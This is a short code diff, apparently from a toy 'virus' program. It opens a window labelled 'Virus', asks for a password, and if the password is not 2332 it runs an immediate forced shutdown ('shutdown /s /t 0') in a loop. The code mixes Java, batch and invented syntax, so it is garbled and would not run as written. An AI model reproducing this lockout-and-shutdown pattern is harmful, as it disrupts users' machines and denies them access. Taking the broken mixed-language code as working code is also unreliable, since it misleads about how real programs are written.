@@ -7,7 +7,7 @@ public static void Main(String[] args) {
     System.add_text.window Virus 150 25 Enter a password
     System.get.window Virus pass 50 20 10 10
     str a = "shutdown /s /t 0"
-    if %pass% == 2332 : start explorer.exe
+    if %pass% == 2332 : System.start explorer.exe
     if %pass% != 2332 : System.start %a%
     goto 1
     
